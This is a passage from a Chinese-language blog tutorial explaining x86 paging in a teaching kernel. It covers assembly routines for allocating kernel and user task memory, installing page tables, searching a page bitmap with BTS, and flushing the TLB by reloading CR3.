class=""><p>接下来创建内核任务，内核任务有自己的动态空间<strong>TCB</strong>，而且它的空间不是动态分配的，是明确指定的的。由于内核被映射到高端字节，所以内核<strong>TCB</strong>的线性地址也变为<strong>0x8001F800</strong>.代码如下：</p><pre><code class="assembly">    ;对门进行测试     mov ebx,message_2    call far [salt_1+256]              ;通过门显示信息(偏移量将被忽略)         ;开始创建和确立内核任务    mov ecx,core_lin_tcb_addr          ;移至高端之后的内核任务TCB线性地址    mov word [es:ecx+0x04],0xffff      ;任务的状态为“忙”    mov dword [es:ecx+0x46],core_lin_alloc_at                                     ;登记内核中可用于分配的起始线性地址    call append_to_tcb_link            ;将内核任务的TCB添加到TCB链中        mov esi,ecx</code></pre><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/a3b525b67a8d9b517437736e9ae5353f-166833015581852.png" class=""><p>若之前分配过地址，在虚拟地址的低端<strong>1MB</strong>，之后就是建立虚拟地址和物理地址的映射；若要再分配内存，那就需要从<strong>0x100000</strong>开始分配，需要将上一个<strong>TCB</strong>的尾部结构修改为这次分配的地址起始位置，即<strong>0x100000</strong>。</p><h2 id="16-为内核任务的TSS分配内存空间"><a href="#16-为内核任务的TSS分配内存空间" class="headerlink" title="16. 为内核任务的TSS分配内存空间"></a>16. 为内核任务的TSS分配内存空间</h2><pre><code class="assembly">    ;为内核任务的TSS分配内存空间。所有TSS必须创建在内核空间    mov ecx,104                        ;为该任务的TSS分配内存    call sys_routine_seg_sel:allocate_memory;创建TSS所需内存是动态分配的                                                ;必须在内核的虚拟地址空间中    mov [es:esi+0x14],ecx              ;在内核TCB中保存TSS基地址</code></pre><p>例程<strong>allocate_memory</strong>：</p><pre><code class="assembly">allocate_memory:;在当前任务的地址空间中分配内存                      ;输入：ECX=希望分配的字节数                      ;输出：ECX=起始线性地址     push eax    push ebx        push ds        ;得到TCB链表首节点的线性地址    ;因为是在当前任务的虚拟线性空间中分配，所以需要搜索TCB链表    ;找到当前TCB，从中取得可用于分配的线性地址，从这个地址处开始分配    mov eax,core_data_seg_sel    mov ds,eax        mov eax,[tcb_chain]                ;EAX=首节点的线性地址        mov ebx,mem_0_4_gb_seg_sel    mov ds,ebx        ;搜索状态为忙（当前任务）的节点.s0:    cmp word [eax+0x04],0xffff    jz .s1;找到忙的节点，EAX=节点的线性地址    mov eax,[eax]    jmp .s0        ;开始分配内存.s1:    mov ebx,eax;找到忙的节点，EAX=节点的线性地址    call sys_routine_seg_sel:task_alloc_memory        pop ds        pop ebx    pop eax        retf</code></pre><p>其中例程<strong>task_alloc_memory</strong>：</p><pre><code class="assembly">task_alloc_memory:;在指定任务的虚拟内存空间中分配内存                        ;并不一定是在当前任务的虚拟内存空间中分配          ;输入：EBX=任务控制块TCB的线性地址          ;      ECX=希望分配的字节数          ;输出：ECX=已分配的起始线性地址    push eax        push ds        push ebx                           ;to A        ;获得本次内存分配的起始线性地址    mov ax,mem_0_4_gb_seg_sel    mov ds,ax        mov ebx,[ebx+0x46]                 ;获得本次分配的起始线性地址    mov eax,ebx    add ecx,ebx                        ;本次分配，最后一个字节之后的线性地址        push ecx                           ;To B                                        ;下一次可以分配的线性地址，需要压栈保护    ;为请求的内存分配页    and ebx,0xfffff000;线性地址低12位没有用，将其清零    and ecx,0xfffff000.next:    call sys_routine_seg_sel:alloc_inst_a_page          ;安装当前线性地址所在的页    add ebx,0x1000                     ;+4096    cmp ebx,ecx    jle .next        ;将用于下一次分配的线性地址强制按4字节对齐    pop ecx                            ;B                                        ;原先保存下一次内存分配可以使用的起始线性地址                                        ;弹出之后要保存到TCB中，这里要先对齐    test ecx,0x00000003                ;线性地址是4字节对齐的吗？    jz .algn                           ;是，直接返回    add ecx,4                          ;否，强制按4字节对齐    and ecx,0xfffffffc    .algn:    pop ebx                            ;A        mov [ebx+0x46],ecx                 ;将下次分配可用的线性地址回存到TCB中    mov ecx,eax        pop ds        pop eax        retf</code></pre><h2 id="17-处理与线性地址对应的页目录项和页表项"><a href="#17-处理与线性地址对应的页目录项和页表项" class="headerlink" title="17. 处理与线性地址对应的页目录项和页表项"></a>17. 处理与线性地址对应的页目录项和页表项</h2><p>接上一节，知道本次内存分配涉及哪些线性地址，这是一个连续的线性地址范围区间，通过循环反复调用<strong>alloc_inst_a_page</strong>来安装与这些线性地址对应的物理页。</p><p>其中例程<strong>task_alloc_memory</strong>：</p><pre><code class="assembly">task_alloc_memory:。。。    ;为请求的内存分配页    and ebx,0xfffff000;线性地址低12位没有用，将其清零    and ecx,0xfffff000.next:    call sys_routine_seg_sel:alloc_inst_a_page          ;安装当前线性地址所在的页    add ebx,0x1000                     ;+4096    cmp ebx,ecx    jle .next</code></pre><p>其中例程<strong>alloc_inst_a_page</strong>用来为指定的线性地址分配一个物理页</p><pre><code class="assembly">    alloc_inst_a_page:;分配一个页，并安装在当前活动的                        ;层级分页结构中                        ;输入：EBX=页的线性地址    push eax    push ebx    push ecx    push esi    push ds        mov eax,mem_0_4_gb_seg_sel    mov ds,eax;后面用线性地址访问页目录表和页表自身做准备        ;线性地址的高10位是页目录表索引    ;用它来检查该线性地址所对应的页表是否存在    mov esi,ebx    and esi,0xffc00000                 ;清除页表索引和页内偏移部分    shr esi,20                         ;将页目录索引乘以4作为页内偏移    or esi,0xfffff000                  ;页目录自身的线性地址+表内偏移        test dword [esi],0x00000001        ;P位是否为“1”。检查该线性地址是    jnz .b1                            ;否已经有对应的页表        ;页目录项不存在，就创建一个新的页表，并将页表的地址写入这个页目录项    ;创建并安装该线性地址所对应的页表    call allocate_a_4k_page;分配一个页做为页表                                ;这个物理地址只保留前20位                                ;后12位是页的属性值，为0x07    or eax,0x00000007;US位是1，即特权级3也可以访问                                ;现在是在为内核人物的TSS分配内存                                ;TSS只能由特权级0的内核任务访问，其所在的页也只能有                                ;特权级0的内核任务访问，但是这里为什么允许特权级3的内存访问呢？                                ;                                ;原则上是不允许的，但是这个例程是通用的，3特权级要求US位是1，                                ;0特权级要求US位是0，                                ;为了省事就把US位置1了    mov [esi],eax               ;在页目录中登记该页表,将页目录项的内容修改为页表的物理地址        ;清空当前页表，把页表当成普通的页来用    mov eax,ebx    and eax,0xffc00000;清空低22位    shr eax,10;右移10次    or eax,0xffc00000;将高10位设置成0x3FF    mov ecx,1024;之后用循环访问页表内的全部页表项.cls0:    mov dword [es:eax],0x00000000    add eax,4;加4得到下一个页表项    loop .cls0    .b1:    ;检查该线性地址对应的页表项（页）是否存在    mov esi,ebx    and esi,0xfffff000                 ;清除页内偏移部分    shr esi,10                         ;将页目录索引变成页表索引，页表索引乘以4作为页内偏移    or esi,0xffc00000                  ;得到该线性地址对应的页表项        test dword [esi],0x00000001        ;P位是否为“1”。检查该线性地址是    jnz .b2                            ;否已经有对应的页        ;创建并安装该线性地址所对应的页    call allocate_a_4k_page            ;分配一个页，这才是要安装的页    or eax,0x00000007    mov [esi],eax    .b2:    pop ds    pop esi    pop ecx    pop ebx    pop eax        retf</code></pre><p>其中把页目录表当成页表使用：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/7b5c22e8ad8cf86185d4ec963a28e64a-166833015581853.png" class=""><p>即页目录表的高10位右移到最右端，再左移两位补0，其余补1.这个线性地址就可以把页目录表当成一个页来用，即访问页目录表自身。</p><p>其中把页表当成普通的页来用：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/272b36f0833457b2c03537b9216d8e1f-166833015581854.png" class=""><h2 id="18-根据需要分配物理页并设置页表项"><a href="#18-根据需要分配物理页并设置页表项" class="headerlink" title="18. 根据需要分配物理页并设置页表项"></a>18. 根据需要分配物理页并设置页表项</h2><p>接上一节，其中例程<strong>alloc_inst_a_page</strong>：用来为指定的线性地址分配一个物理页</p><pre><code class="assembly">alloc_inst_a_page:    ......          .b1:         ;检查该线性地址对应的页表项（页）是否存在         mov esi,ebx         and esi,0xfffff000                 ;清除页内偏移部分         shr esi,10                         ;将页目录索引变成页表索引，页表索引乘以4作为页内偏移         or esi,0xffc00000                  ;得到该线性地址对应的页表项         test dword [esi],0x00000001        ;P位是否为“1”。检查该线性地址是         jnz .b2                            ;否已经有对应的页         ;创建并安装该线性地址所对应的页         call allocate_a_4k_page            ;分配一个页，这才是要安装的页         or eax,0x00000007         mov [esi],eax  .b2:         pop ds         pop esi         pop ecx         pop ebx         pop eax         retf                 </code></pre><p>要想判断与线性地址对应的页表项是否有效，需要访问页表自身，将页表当成一个普通的页来访问。</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/a05d401b9a96a903b54d20c9fb3d038a-166833015581855.png" class=""><p>此时图中第三行的线性地址就是我们要访问的那个页表项的线性地址</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/0fd5c986eb285833f1dfcfffe044b0ac-166833015581856.png" class=""><p>如上图，访问过程。</p><h2 id="19-物理内存的页面管理和页映射位串"><a href="#19-物理内存的页面管理和页映射位串" class="headerlink" title="19. 物理内存的页面管理和页映射位串"></a>19. 物理内存的页面管理和页映射位串</h2><p>无论分配页表还是物理页，都要调用例程<strong>allocate_a_4k_page</strong>，这个例程用来分配物理页，对于每个任务来说内存分配包括两个互相连续的部分：首先是在任务自己的虚拟内存空间中分配，然后将其映射到物理内存中的页。</p><p>物理页的数量是有限的，是所有任务共享的，若物理页空间不足，还需要执行内存换入换出操作。操作系统需要在上电之后就检测实际的物理内存数量，并建立一张表格登记每个页的基本信息，包括页的物理地址以及是否空闲。<strong>4GB</strong>共可分配<mark>1048576</mark>个页，为了简单起见，使用位串指定页的位置和分配情况。</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/e66f60ea08bb0e11cc9de0dd2e497b7a-166833015581857.png" class=""><p>比特的位置决定页的位置，比特位的值决定了页的分配情况，<strong>0</strong>表示此页空闲、<strong>1</strong>表示此页被占用。</p><p>在本章中没有检测实际内存的代码，仅仅假定我们只有<strong>2MB</strong>的物理内存空间可用，<strong>2MB = 512KB</strong>，需要<strong>512</strong>个位串，使用连续的字数据来声明位串，在内核数据段中：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/13f99b6ba093a2a18cba25f1489a24ab-166833015581858.png" class=""><p>第一个字节<strong>0xff</strong>的<strong>位0</strong>对应<strong>物理地址为0</strong>的页，<strong>位1</strong>对应<strong>物理地址为0x1000</strong>的页；<br>第二个字节<strong>0xff</strong>的位0对应物理地址为<strong>0x8000</strong>的页，位1对应物理地址为<strong>0x9000</strong>的页；<br>把比特在比特串中的序号乘以<strong>0x1000</strong>就得到其所对应的物理页的地址（0x1000递增）。<br>前32字节对应内存最低端<strong>1MB</strong>中的页，共256个页。这一部分已经整体划归内核使用，没有被内核占用的部分也大多被外围硬件占用，包括ROM-BIOS。</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/6a69e2857945ee2dba5b35e8cc22619f-166833015581859.png" class=""><p>其中前32个字节中有两个<strong>0x55</strong>，对应<strong>48~63</strong>，16进制是<strong>0x30~0x3F</strong>，乘以<strong>0x1000</strong>之后对应物理页范围是<strong>0x30000~0x3F000</strong>共<strong>64KB</strong>，可以划分为16个页。为了表明页的分配是随机的，即连续的线性地址空间不必对应连续的页，有意将页在物理上分开，<strong>0x55 = 01010101</strong>，表示空闲页和已经分配的页是交替出现的。</p><p>但是将<strong>0x55</strong>对应的<strong>16个页</strong>作为空闲页分配未必合理，因为低端1MB内存已经分配给内核，在内核的页表中，已经有页表项指向这16个页，若在将其分配给其他任务，那么其他任务的页表项有势必指向这16个页，即重复分配。但是线性地址到物理页的映射可以是重复的，内核也不会使用这16个页，分配给其他任务也无妨。</p><h2 id="20-空闲页的搜索和BTS指令"><a href="#20-空闲页的搜索和BTS指令" class="headerlink" title="20. 空闲页的搜索和BTS指令"></a>20. 空闲页的搜索和BTS指令</h2><p>接上一节，查看例程<strong>allocate_a_4k_page</strong>：</p><pre><code class="assembly">    allocate_a_4k_page:;分配一个4KB的页                                ;输入：无                                ;输出：EAX=页的物理地址                                ;每个页的状态可以从页映射位串中获得    push ebx    push ecx    push edx    push ds        mov eax,core_data_seg_sel    mov ds,eax;指向内核数据段，以便指向页映射位串        xor eax,eax;循环，从头开始搜索位串，查找空闲的页                    ;从页映射位串中找到第一个为0的比特                    ;记下在整个位串中的位置.b1:    bts [page_bit_map],eax;搜索位串，寻找第一个为0的比特    jnc .b2    inc eax    cmp eax,page_map_len*8    jl .b1        mov ebx,message_3    call sys_routine_seg_sel:put_string    hlt;没有可以分配的页，停机    .b2:    shl eax,12;乘以4096（0x1000）        pop ds    pop edx    pop ecx    pop ebx        ret</code></pre><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/656dfa078ff57ba75bd187ffe33d9b41-166833015581860.png" class=""><ul><li>测试位串中的某个比特，用该比特的值设置标志寄存器的进位标志<strong>CF</strong>，然后将位串中的比特置1</li><li>目的操作数：<strong>16、32、64</strong>位的通用寄存器，或者是用于指定位串起始位置的内存地址，若是寄存器，则指定的位串就是该寄存器的内容</li><li>源操作数：<strong>16、32、64</strong>位的通用寄存器，用于指定待测试比特在位串中的位置，索引</li><li>目的操作数和源操作数若都为通用寄存器，则长度必须是一致的</li></ul><p>目的操作数是通用寄存器：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/3dcec8f0d43ee50f8db16c63509ea2dc-166833015581861.png" class=""><p><strong>EDX</strong>是<font color="red">待测试位串</font>，<strong>ECX</strong>包含那个待测试比特的索引。如果目的操作数是寄存器，<mark>则根据目的操作数的长度，处理器先求得源操作数除以<strong>16、32、64</strong>的余数，并将其作为待测试比特的索引<mark>，然后从<font color="red">待测试位串</font>中取得该比特，并传送到标志寄存器的<strong>CF</strong>位，最后将该比特<strong>置1</strong>。<br><mark>在这里就是将ecx除以32取余，将余数作为索引在edx中找到对应的比特位查看是0还是1，并将其写入EFLAGS的CF位，然后不管是0还是1都要将在edx中找到的对应比特位置1<mark>。</mark></mark></mark></mark></p><p>目的操作数是内存地址：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/194209671b306b8380b601d6be27d590-166833015581862.png" class=""><p>目的操作数给出的是该位串在在内存中的第一个字节的地址，源操作数指定了可以访问的串的最大长度，若源操作数是16位的，则目的操作数即位串最大可以达到<strong>2^16</strong>个比特。</p><h2 id="21-空闲页搜索和分配的具体过程"><a href="#21-空闲页搜索和分配的具体过程" class="headerlink" title="21. 空闲页搜索和分配的具体过程"></a>21. 空闲页搜索和分配的具体过程</h2><p>接上一节，查看例程<strong>allocate_a_4k_page</strong>：</p><pre><code class="assembly">SECTION core_data vstart=0                  ;系统核心的数据段    ......    ......        page_bit_map    db  0xff,0xff,0xff,0xff,0xff,0xff,0x55,0x55                    db  0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff                    db  0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff                    db  0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff                    db  0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x55                    db  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00                    db  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00                    db  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00    page_map_lenequ$-page_bit_map    ......    ......    ......    allocate_a_4k_page:;分配一个4KB的页                                ;输入：无                                ;输出：EAX=页的物理地址                                ;每个页的状态可以从页映射位串中获得    push ebx    push ecx    push edx    push ds        mov eax,core_data_seg_sel    mov ds,eax;指向内核数据段，以便指向页映射位串        xor eax,eax;循环，从头开始搜索位串，查找空闲的页                    ;从页映射位串中找到第一个为0的比特                    ;记下在整个位串中的位置.b1:    bts [page_bit_map],eax;搜索位串，寻找第一个为0的比特                            ;每次搜索的比特位的值都会传送到CF位                            ;并且位串中的这个比特位被置1    jnc .b2;若CF=0，表示找到了空闲的页面，转到 .b2处执行，                ;若CF=1，表示当前比特对应的页面被分配过了，还得继续查找。    inc eax    cmp eax,page_map_len*8;page_map_len是位串的字节长度                                ;乘以8换算成二进制比特位的数量    jl .b1;若没有超过，小于关系成立，转移到标号 .b1 处重新查找空闲页                ;若超过了位串最大长度，小于关系不成立，打印文本，停机    mov ebx,message_3    call sys_routine_seg_sel:put_string    hlt;没有可以分配的页，停机    .b2:;一旦找到空闲页，到达此处                        ;EAX保存代表空闲页的那个比特位的索引号                        ;将这个索引号乘以0x1000、4096就得到所应对的那个页的物理地址    shl eax,12;乘以4096（0x1000）        pop ds    pop edx    pop ecx    pop ebx        ret</code></pre><p>内存分配的全过程：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/5837f70290e6bb72a757e1bcef580a32-166833015581863.png" class=""><h2 id="22-确立内核任务并开始创建用户任务"><a href="#22-确立内核任务并开始创建用户任务" class="headerlink" title="22. 确立内核任务并开始创建用户任务"></a>22. 确立内核任务并开始创建用户任务</h2><p>接上一节，回到内核<strong>start</strong>流程中<br>在<strong>TSS</strong>中登记必要项：</p><pre><code class="assembly">         ;在程序管理器的TSS中设置必要的项目         mov word [es:ecx+0],0              ;反向链=0         mov eax,cr3         mov dword [es:ecx+28],eax          ;登记CR3(PDBR)         mov word [es:ecx+96],0             ;没有LDT。处理器允许没有LDT的任务。         mov word [es:ecx+100],0            ;T=0         mov word [es:ecx+102],103          ;没有I/O位图。0特权级事实上不需要。                                            ;不需要0、1、2特权级堆栈。0特级不                                            ;会向低特权级转移控制。 </code></pre><p>其中<strong>TSS</strong>还有其他信息没有填写，这些信息会在处理器进行第一次任务切换时自动填写。<br>接着创建<strong>TSS</strong>描述符、加载当前任务到<strong>TR</strong>寄存器中。<br>接着创建用户任务的<strong>TCB</strong>并加载到<strong>TCB</strong>的链表中、接着使用例程<strong>load_relocate_program</strong>创建用户任务相关内容。</p><h2 id="23-用户任务的内存分配策略"><a href="#23-用户任务的内存分配策略" class="headerlink" title="23. 用户任务的内存分配策略"></a>23. 用户任务的内存分配策略</h2><p>创建用户任务的第一步就是分配内存，将用户任务的程序加载进来。</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/aca041c9ac0123cdb24af86c9edcd428-166833015581864.png" class=""><p>当前正在执行内核的页目录表和页表，也就无法通过用户任务的页目录表和页表来访问内存，也不能切换到用户任务的页目录表和页表，切换之后内核就不能执行下去了。</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/dd2b5a8684bfc62701272aea8478fbf0-166833015581865.png" class=""><p>先给出内核任务、用户任务如何将虚拟地址空间映射到物理地址空间的：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/6fd5cdbb83920e3cf30528b36302925c-166833015581866.png" class=""><p>其中内核与内核任务是共享高2GB空间的，所以在所有任务的页目录的高端都是一样的，在内核的页表中，既包含了内核所占用的物理页面，也包含了内核任务私有的物理页面。不过没有关系，因为只有内核任务才会使用页目录表的高2GB的表项，用户任务只会使用页目录低2GB的表项。</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/349244ce1593efe244c1b0adc27561fd-166833015581867.png" class=""><p>在内核任务的虚拟内存的低2GB是未使用的，那么对应内核任务的页目录中低一半的表项也是未使用的。</p><p>那么在创建用户任务时可以先在内核任务的虚拟空间的低一半分配内存，即使用页目录的低一半创建页目录表项，同时也会创建一些与这部分对应的页表并分配物理页。</p><p>因为是在创建用户任务，所以还会从硬盘中读出用户任务，写入分配来的这些物理页中。</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/f4f000bbf6183222289074429bf531a0-166833015581868.png" class=""><p>等这些工作完成之后，将内核任务的页目录表复制一份，作为被创建的用户任务的页目录表。此时用户任务的高一半指向内核的页表，低一半指向刚才创建的用户任务的页表。再复制之后，将内核任务的低一半页目录表清空。</p><h2 id="24-清空内核任务页目录表的前半部分并刷新TLB"><a href="#24-清空内核任务页目录表的前半部分并刷新TLB" class="headerlink" title="24. 清空内核任务页目录表的前半部分并刷新TLB"></a>24. 清空内核任务页目录表的前半部分并刷新TLB</h2><p>接上一节，进入例程<strong>load_relocate_program</strong>，加载重定位用户程序，并创建用户任务。本节代码如下：</p><pre><code class="assembly">load_relocate_program:                      ;加载并重定位用户程序                                            ;输入: PUSH 逻辑扇区号                                            ;      PUSH 任务控制块基地址                                            ;输出：无          pushad               push ds         push es               mov ebp,esp                        ;为访问通过堆栈传递的参数做准备               mov ecx,mem_0_4_gb_seg_sel         mov es,ecx         ;清空当前页目录的前半部分（对应低2GB的局部地址空间）         mov ebx,0xfffff000         xor esi,esi  .clsp:         mov dword [es:ebx+esi*4],0x00000000         inc esi         cmp esi,512         jl .clsp         mov ebx,cr3                        ;刷新TLB         mov cr3,ebx                                                       </code></pre><p>开启页部件时，页部件使用页目录和页表将线性地址转换为物理地址。而访问页目录表和页表是耗时的，因此把页表项提前存放到处理器中可以加快地址转换的速度，为此在处理器内部特地构造了一个高速缓存装置<strong>（Transaction Lookaside Buffer）</strong>。</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/07556a53fea08215d82d60162499308e-166833015581969.png" class=""><ul><li>处理器用线性地址的<strong>高20位</strong>查找<strong>TLB</strong>中的行，查找标记相同的行。找到之后就使用其数据部分的<strong>页物理地址</strong>转换当前线性地址</li><li>若查找不成功，则处理器还要访问内存中的页目录表和页表，找到对应的页表项，将其填写到<strong>TLB</strong>中。</li></ul><p><strong>TLB</strong>的容量不大，若装满之后还需要置换掉那些使用较少的条目。<strong>TLB</strong>中的属性位来自于页表项如<strong>D位</strong>。访问权来自于页目录项，如<strong>RW位</strong>、<strong>US位</strong>，具体取页目录项还是页表中的值，若页目录的<strong>RW = 0</strong>、页表项的<strong>RW = 1</strong>，按照<strong>RW = 0</strong>执行，即取最严格的权限执行 （等于是将访问权进行<strong>与操作</strong>）。</p><p>处理器仅仅缓存那些<strong>P位 = 1</strong>的页表项，而且<strong>TLB</strong>的工作和<strong>CR3</strong>寄存器的<strong>PCD、PWT</strong>无关，另外对于页表项的修改不会同时反映到<strong>TLB</strong>中。</p><p>如果内存表中的页表项已经修改，对应<strong>TLB</strong>中的条目还没有被更新，那么转换后的物理地址必定是错误的。</p><p>在本章里，内核任务页目录表的前一半用于创建用户任务，所以是频繁更新的，在创建用户任务时，必须先清除这一部分页目录项并刷新<strong>TLB</strong>。否则处理器将使用缓存的页表项访问内存，将会产生错误。</p><p><strong>TLB</strong>的内容或条目不可由软件直接访问的，所以不能直接更改或刷新它的内容，但是有其它办法刷新，比如将<strong>CR3</strong>的内容读出再原样写入，这样就会使得<strong>TLB</strong>中的所有条目失效。当任务切换时因为需要从新任务的<strong>TSS</strong>中加载<strong>CR3</strong>，这样会隐式的导致<strong>TLB</strong>的所有条目无效并重新刷新。</p><p>上述方法对那些<strong>G位 = 1</strong>的表项是无效的，被设置为全局的页表项应该始终被缓存在<strong>TLB</strong>中，在前面我们已经清空了页目录表的前半部分，为了使<strong>TLB</strong>的条目失效，需要重新加载<strong>CR3</strong>.</p><h2 id="25-为用户任务分配内存并创建LDT"><a href="#25-为用户任务分配内存并创建LDT" class="headerlink" title="25. 为用户任务分配内存并创建LDT"></a>25. 为用户任务分配内存并创建LDT</h2><p>接上一节，在清空内核任务页目录表的前半部分并刷新了<strong>TLB</strong>之后，就可以分配内存并加载用户程序了，本节代码如下：</p><pre><code class="assembly">mov esi,[ebp+11*4]                 ;从堆栈中取得TCB的基地址         ;以下申请创建LDT所需要的内存         mov ebx,esi         mov ecx,160                        ;允许安装20个LDT描述符         call sys_routine_seg_sel:task_alloc_memory         mov [es:esi+0x0c],ecx              ;登记LDT基地址到TCB中         mov word [es:esi+0x0a],0xffff      ;登记LDT初始的界限到TCB中  </code></pre><p>申请内存：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/fc207a4863236bff10f6dae579f1fc5e-166833015581970.png" class=""><p><strong>情况1</strong>：</p><ul><li>对于任何一个正在执行的任务，若要申请额外的内存空间，可以调用例程<strong>allocate_memory</strong></li><li>例程<strong>allocate_memory</strong>需要调用<strong>task_allocate_memory</strong>，需要当前任务自己的TCB作为参数，所以例程<strong>allocate_memory</strong>需要获得当前任务控制块<strong>TCB</strong></li><li>例程<strong>task_allocate_memory</strong>需要访问<strong>TCB</strong>，来确定本次内存分配器始于哪个线性地址，并根据分配的内存数量确定一个地址范围</li><li>若当前任务是内核任务，那么这个线性地址范围一定位于虚拟线性地址的高端、普通任务则位于虚拟线性地址的低端</li><li>确定线性地址范围之后，调用<strong>alloc_inst_a_page</strong>来分配和安装与线性地址相关的物理页。首先检查当前任务的页目录表和页表，看一下表项是否存在。存在说明之前分配过，直接返回</li><li>不存在，则调用例程<strong>allocate_a_4k_page</strong>在物理页中查找并返回空闲的物理页地址</li><li>无论如何，例程<strong>alloc_inst_a_page</strong>都是在当前任务的页目录和页表中登记线性地址与物理页的对应关系。</li></ul><p><strong>情况2</strong>：<br>在一个任务被创建并开始执行之前，需要先创建这个任务自己的虚拟内存空间，并在这个虚拟内存空间里分配用来加载这个任务的代码和数据。用户任务的创建是内核任务的工作，所以需要有内核任务代替用户任务来完成内存的创建和分配。</p><p>因为这个原因，需要借用内核任务页目录的前半部分来分配内存，内存分配完成用户任务创建之后，再将内核任务的页目录表复制一份给用户任务就可以了</p><p>有内核任务代替用户任务分配内存时，内核任务需要拿着用户任务的<strong>TCB</strong>来调用例程<strong>task_allocate_memory</strong>。毕竟内存分配是在用户任务自己的虚拟空间中进行，需要从用户任务自己的<strong>TCB</strong>中取得本次分配需要的线性地址。虽然是为用户任务分配内存，但却是在内核任务的页目录表中登记了页目录表项，这没关系后面直接复制一份即可。</p><h2 id="26-用户程序的加载和重定位"><a href="#26-用户程序的加载和重定位" class="headerlink" title="26. 用户程序的加载和重定位"></a>26. 用户程序的加载和重定位</h2><p>上一节已经为<strong>LDT</strong>分配了内存，接下来就是从硬盘读取用户程序</p><p>加载用户程序头部读取用户程序总字节数、将用户程序总字节数换算为总扇区数、循环读取用户程序剩余部分、建立用户程序的段描述符：</p><p>用户程序的<strong>SALT</strong>在用户程序头部段中，但是用户程序头部段暂时不能访问，因为当前任务是内核任务而不是用户任务</p><p>现在考虑一下用户程序什么能访问、什么不能访问，我们现在是在内核虚拟空间的低2GB虚拟空间里分配内存并加载用户程序，所以加载之后的内容是可以访问到的，不过现在是借助内核地址空间来访问的。</p><p>现在创建了用户程序的段选择子和段描述符，但是不能使用，因为这些段位于用户任务的<strong>LDT</strong>中，只有<strong>LDTR</strong>寄存器指向这个<strong>LDT</strong>才能访问这些段。但是当前是在内核任务中，是没有<strong>LDT</strong>的</p><p>之后重定位<strong>SALT</strong>、创建用户程序调用门0、1、2特权级的栈、在<strong>GDT</strong>中登记<strong>LDT</strong>描述符、创建用户程序的<strong>TSS</strong>、登记基本的<strong>TSS</strong>表格内容、访问用户程序头部段，获取数据填充<strong>TSS</strong>、在<strong>GDT</strong>中登记<strong>TSS</strong>描述符、创建用户任务的页目录，最后返回调用者。</p><h2 id="27-用户任务页目录表的创建和访问以及INVLPG指令"><a href="#27-用户任务页目录表的创建和访问以及INVLPG指令" class="headerlink" title="27. 用户任务页目录表的创建和访问以及INVLPG指令"></a>27. 用户任务页目录表的创建和访问以及INVLPG指令</h2><p>接上一节，当用户任务的加载和创建结束时，需要将内核任务的页目录表复制给用户任务。代码如下：</p><pre><code class="assembly">         ;创建用户任务的页目录         ;注意！页的分配和使用是由页位图决定的，可以不占用线性地址空间         call sys_routine_seg_sel:create_copy_cur_pdir         mov ebx,[es:esi+0x14]              ;从TCB中获取TSS的线性地址         mov dword [es:ebx+28],eax          ;填写TSS的CR3(PDBR)域   </code></pre><p>例程<strong>create_copy_cur_pdir</strong>：</p><pre><code 